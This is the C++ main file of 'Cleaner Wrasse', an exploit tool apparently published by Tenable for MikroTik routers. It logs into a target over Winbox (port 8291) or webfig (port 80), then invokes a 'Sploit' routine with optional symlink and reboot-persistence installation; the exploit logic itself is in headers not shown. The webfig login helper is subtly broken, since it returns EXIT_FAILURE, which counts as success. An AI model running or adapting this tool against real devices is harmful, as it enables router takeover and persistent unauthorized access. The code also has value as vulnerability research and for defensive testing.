  /*
    Copyright 2018-2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#include <sstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>

#include "md5.hpp"
#include "sploit.hpp"
#include "winbox_session.hpp"
#include "jsproxy_session.hpp"

namespace
{
    const char s_version[] = "><(((°> Cleaner Wrasse 1.0 - August 11, 2019 ><(((°>";

    /**
     * Uses program options to parse the command line. The command line requires three things:
     * 
     * 1. An IP address.
     * 2. A username.
     * 3. A password (although this will default to the empty string if not provided).
     * 
     * Further, the user can specify "symlink" to drop a symlink in /rw/disk/ in versions 6.41+
     * and they can specify persistence to add logic to survive reboots in versions 6.41+.
     * 
     * \param[in] p_argCount the number of args provided
     * \param[in] p_argArray the array of cli arguments
     * \param[in,out] p_username the username parsed from the arg array
     * \param[in,out] p_password the password parsed from the arg array
     * \param[in,out] p_ip the router's ip parsed from the arg array
     * \param[in,out] p_do_sym indicates if we should drop the symlink (guess what... arg array)
     * \param[in,out] p_do_persistence indicates if we should install a persistence mechanism (still the arg array)
     * 
     * \return if we didn't have enough params to continue then return false. True on success.
     */
    bool parseCommandLine(int p_argCount, const char* p_argArray[],
                          std::string& p_username, std::string& p_password,
                          std::string& p_ip, bool& p_do_sym, bool& p_do_persistence)
    {
        boost::program_options::options_description description("options");
        description.add_options()
        ("help,h", "A list of command line options")
        ("version,v", "Display version information")
        ("username,u", boost::program_options::value<std::string>(), "REQUIRED The user to log in as.")
        ("password,p", boost::program_options::value<std::string>()->default_value(""), "The password to log in with (if not provided CW uses an empty string).")
        ("ip,i", boost::program_options::value<std::string>(), "REQUIRED The IPv4 address to connect to.")
        ("symlink,s", boost::program_options::value<bool>()->default_value(false), "Add the survival symlink on the target if its 6.41+")
        ("persistence", boost::program_options::value<bool>()->default_value(false), "Enable persistence on targets 6.41+");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_argCount, p_argArray, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << "\n" << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("username") && argv_map.count("ip"))
        {
            p_username.assign(argv_map["username"].as<std::string>());
            p_ip.assign(argv_map["ip"].as<std::string>());
            p_password.assign(argv_map["password"].as<std::string>());
            p_do_sym = argv_map["symlink"].as<bool>();
            p_do_persistence = argv_map["persistence"].as<bool>();
            return true;
        }
        else
        {
            std::cerr << description << std::endl;
        }

        return false;
    }

    /**
     * Attempts to connect to port 8291 on the remote device and login via our insecure
     * Winbox implementation.
     * 
     * \param[in,out] p_session - the winbox session that contains the underlying protocol tracking
     * \param[in] p_username - the user to login as
     * \param[in] p_password - the password to login with
     * \param[in] p_ip - the ip we are connecting to
     * 
     * \return true if we were able to login and false otherwise
     */
    bool try_winbox(Winbox_Session& p_session, const std::string& p_username,
                    const std::string& p_password, const std::string& p_ip)
    {
        std::cout << "[+] Trying winbox on " << p_ip << ":8291" << std::endl;
        if (!p_session.connect())
        {
            std::cerr << "[-] Failed to connect over port 8291" << std::endl;
            return false;
        }
        std::cout << "[+] Connected on 8291!" << std::endl;

        std::cout << "[+] Logging in as " << p_username << std::endl;
        boost::uint32_t p_session_id = 0;
        if (!p_session.login(p_username, p_password, p_session_id))
        {
            std::cerr << "[-] Login failed." << std::endl;
            return false;
        }

        std::cout << "[+] Login success!" << std::endl;
        return true;
    }

    /**
     * Attempts to connect to port 80 on the remote device and login via the rc4
     * version of the webfig.
     * 
     * \param[in,out] p_session - the jsproxy session that contains the underlying protocol tracking
     * \param[in] p_username - the user to login as
     * \param[in] p_password - the password to login with
     * \param[in] p_ip - the ip we are connecting to
     * 
     * \return true if we were able to login and false otherwise
     */
    bool try_webfig(JSProxySession& p_session, const std::string& p_username,
                    const std::string& p_password, const std::string& p_ip)
    {
        std::cout << "[+] Trying webfig on " << p_ip << ":80" << std::endl;
        if (!p_session.connect())
        {
            std::cerr << "[-] Failed to connect over port 80." << std::endl;
            return EXIT_FAILURE;
        }
        std::cout << "[+] Connected on 80!" << std::endl;

        std::cout << "[+] Logging in as " << p_username << std::endl;
        if (!p_session.negotiateEncryption(p_username, p_password))
        {
            std::cerr << "[-] Login failed." << std::endl;
            return EXIT_FAILURE;
        }

        std::cout << "[+] Login success!" << std::endl;
        return true;
    }
}

int main(int p_argc, const char** p_argv)
{
    std::string username;
    std::string password;
    std::string ip;
    bool do_sym = false;
    bool do_persistence = false;
    if (!parseCommandLine(p_argc, p_argv, username, password, ip, do_sym, do_persistence))
    {
        return EXIT_FAILURE;
    }

    std::cout << std::endl;
    std::cout << "            ><(((°>         ><(((°>         ><(((°> " << std::endl;
    std::cout << "           ╔═╗┬  ┌─┐┌─┐┌┐┌┌─┐┬─┐  ╦ ╦┬─┐┌─┐┌─┐┌─┐┌─┐" << std::endl;
    std::cout << "           ║  │  ├┤ ├─┤│││├┤ ├┬┘  ║║║├┬┘├─┤└─┐└─┐├┤ " << std::endl;
    std::cout << "           ╚═╝┴─┘└─┘┴ ┴┘└┘└─┘┴└─  ╚╩╝┴└─┴ ┴└─┘└─┘└─┘" << std::endl;
    std::cout << "                    <°)))><         <°)))><         " << std::endl;
    std::cout << std::endl;
    std::cout << "   \"Cleaners are nothing but very clever behavioral parasites\"" << std::endl;
    std::cout << std::endl;

    Winbox_Session winboxSession(ip, "8291");
    JSProxySession jsSession(ip, "80");

    if (try_winbox(winboxSession, username, password, ip))
    {
        Sploit sploiter(winboxSession, username, password, do_sym, do_persistence);
        sploiter.pwn();
    }
    else if (try_webfig(jsSession, username, password, ip))
    {
        Sploit sploiter(jsSession, username, password, do_sym, do_persistence);
        sploiter.pwn();
    }

    return EXIT_SUCCESS;
}
